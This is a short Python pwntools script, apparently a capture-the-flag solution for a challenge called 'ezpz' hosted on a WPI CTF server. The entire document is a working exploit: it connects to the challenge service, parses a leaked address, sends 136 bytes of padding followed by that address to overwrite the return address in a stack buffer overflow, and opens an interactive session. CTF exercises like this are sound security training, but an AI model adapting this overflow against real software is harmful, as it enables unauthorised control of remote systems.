#!/usr/bin/env python
from pwn import *
#r = process('/tmp/p/a')
r = remote('ezpz.wpictf.xyz', 31337)
r.recvuntil('Debugging ')
addr = int(r.recvuntil(' '),16)
print "addr: ",hex(addr)
trash = 'a'*136
r.recvrepeat(0.1)
r.sendline(trash + p64(addr))
r.interactive()